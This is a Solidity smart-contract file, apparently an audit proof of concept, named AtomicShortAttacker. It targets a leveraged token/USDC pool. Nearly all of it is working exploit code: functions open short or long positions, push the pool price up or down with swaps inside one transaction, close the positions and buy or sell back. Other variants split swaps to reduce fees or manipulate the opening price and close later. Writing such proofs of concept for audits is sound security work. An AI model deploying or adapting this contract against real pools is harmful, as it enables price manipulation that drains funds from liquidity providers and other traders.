// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IPoolR4 {
    function swap(uint256 amountIn, uint256 minAmountOut, bool tokenToUsdc, address recipient) external;
    function openShort(uint256 usdcNotional, uint256 minAirUsdOut, address recipient) external;
    function openLong(uint256 usdcAmount, uint256 minAirTokenOut, address recipient) external;
    function closeShort(uint256 nftId, uint256 minUsdcOut, address to) external;
    function closeLong(uint256 nftId, uint256 minUsdcOut, address to) external;
    function backedAirToken() external view returns (uint256);
    function backedAirUsd() external view returns (uint256);
    function effectiveLeverageCap() external view returns (uint256);
}

/// Audit R4 PoC: open -> move -> close -> unwind in ONE transaction, so every
/// price-ring snapshot is at or before the position's openedAt and the clamp is blind.
contract AtomicShortAttacker is IERC721Receiver {
    IPoolR4 public immutable pool;
    IERC20 public immutable usdc;
    IERC20 public immutable token;
    uint256 private lastId;

    constructor(address pool_, address usdc_, address token_) {
        pool = IPoolR4(pool_); usdc = IERC20(usdc_); token = IERC20(token_);
        IERC20(usdc_).approve(pool_, type(uint256).max);
        IERC20(token_).approve(pool_, type(uint256).max);
    }

    /// Short `k` times at `notional`, dump `dump` tokens, close all, buy the dump back.
    function attackShort(uint256 notional, uint256 k, uint256 dump) external {
        uint256[] memory ids = new uint256[](k);
        for (uint256 i; i < k; i++) {
            pool.openShort(notional, 0, address(this));
            ids[i] = lastId;
        }
        pool.swap(dump, 0, true, address(this));             // token -> USDC
        for (uint256 i; i < k; i++) pool.closeShort(ids[i], 0, address(this));
        pool.swap(_usdcFor(dump), 0, false, address(this)); // USDC -> token, >= dump back
    }

    /// The long mirror: long, pump with USDC, close, sell the pumped tokens back.
    function attackLong(uint256 notional, uint256 pump) external {
        uint256 tokBefore = token.balanceOf(address(this));
        pool.openLong(notional, 0, address(this));
        uint256 id = lastId;
        pool.swap(pump, 0, false, address(this));
        pool.closeLong(id, 0, address(this));
        pool.swap(token.balanceOf(address(this)) - tokBefore, 0, true, address(this));
    }

    /// Chunked: `k` shorts, each at min(notional, cap); dump in `j` swaps; close all;
    /// rebuy the dump in `j` swaps. Splitting a swap keeps its fee near 1 % of output.
    function attackShortChunked(uint256 notional, uint256 k, uint256 dump, uint256 j) external {
        uint256[] memory ids = new uint256[](k);
        for (uint256 i; i < k; i++) {
            uint256 cap = pool.effectiveLeverageCap();
            pool.openShort(notional < cap ? notional : cap, 0, address(this));
            ids[i] = lastId;
        }
        for (uint256 i; i < j; i++) pool.swap(dump / j, 0, true, address(this));
        uint256 sold = (dump / j) * j;
        for (uint256 i; i < k; i++) pool.closeShort(ids[i], 0, address(this));
        uint256 got;
        for (uint256 i; i < j; i++) {
            uint256 want = (sold - got) / (j - i);
            uint256 t0 = token.balanceOf(address(this));
            pool.swap(_usdcFor(want), 0, false, address(this));
            got += token.balanceOf(address(this)) - t0;
        }
    }

    /// Long mirror, chunked: long, pump in `j` swaps, close, sell the pump back in `j` swaps.
    function attackLongChunked(uint256 notional, uint256 pump, uint256 j) external {
        uint256 tokBefore = token.balanceOf(address(this));
        pool.openLong(notional, 0, address(this));
        uint256 id = lastId;
        for (uint256 i; i < j; i++) pool.swap(pump / j, 0, false, address(this));
        pool.closeLong(id, 0, address(this));
        uint256 held = token.balanceOf(address(this)) - tokBefore;
        for (uint256 i; i < j; i++) {
            uint256 a = held / (j - i);
            pool.swap(a, 0, true, address(this));
            held -= a;
        }
    }

    // ── F-2: manipulate the OPEN, close honestly later ─────────────────────────

    uint256[] public held;
    bool public heldLong;

    /// One tx: pump with `pump` USDC in `j` swaps, open `k` shorts at the inflated
    /// price, sell every pumped token back in `j` swaps. The close comes later.
    function openManipShort(uint256 pump, uint256 notional, uint256 k, uint256 j) external {
        uint256 t0 = token.balanceOf(address(this));
        for (uint256 i; i < j; i++) pool.swap(pump / j, 0, false, address(this));
        for (uint256 i; i < k; i++) {
            uint256 cap = pool.effectiveLeverageCap();
            pool.openShort(notional < cap ? notional : cap, 0, address(this));
            held.push(lastId);
        }
        heldLong = false;
        uint256 bought = token.balanceOf(address(this)) - t0;
        for (uint256 i; i < j; i++) {
            uint256 a = bought / (j - i);
            pool.swap(a, 0, true, address(this));
            bought -= a;
        }
    }

    /// One tx: dump `dump` borrowed tokens in `j` swaps, open a long at the depressed
    /// price, buy the dump back in `j` swaps. The close comes later.
    function openManipLong(uint256 dump, uint256 notional, uint256 j) external {
        for (uint256 i; i < j; i++) pool.swap(dump / j, 0, true, address(this));
        uint256 sold = (dump / j) * j;
        uint256 cap = pool.effectiveLeverageCap();
        pool.openLong(notional < cap ? notional : cap, 0, address(this));
        held.push(lastId);
        heldLong = true;
        uint256 got;
        for (uint256 i; i < j; i++) {
            uint256 want = (sold - got) / (j - i);
            uint256 t0 = token.balanceOf(address(this));
            pool.swap(_usdcFor(want), 0, false, address(this));
            got += token.balanceOf(address(this)) - t0;
        }
    }

    /// A later, honest close of everything held.
    function closeHeld() external {
        for (uint256 i; i < held.length; i++) {
            if (heldLong) pool.closeLong(held[i], 0, address(this));
            else pool.closeShort(held[i], 0, address(this));
        }
        delete held;
    }

    function _cp(uint256 a, uint256 ri, uint256 ro) internal pure returns (uint256) {
        uint256 raw = a * ro / (ri + a);
        uint256 fn = a * ro * 100;
        uint256 fd = ri * 10_000;
        uint256 fee = fn == 0 ? 0 : (fn + fd - 1) / fd;
        return raw <= fee ? 0 : raw - fee;
    }

    function _usdcFor(uint256 want) internal view returns (uint256) {
        uint256 y = pool.backedAirUsd();
        uint256 x = pool.backedAirToken();
        uint256 lo = 1;
        uint256 hi = 1;
        while (_cp(hi, y, x) < want) hi *= 2;
        while (lo < hi) {
            uint256 mid = (lo + hi) / 2;
            if (_cp(mid, y, x) >= want) hi = mid; else lo = mid + 1;
        }
        return lo;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        lastId = tokenId;
        return IERC721Receiver.onERC721Received.selector;
    }
}
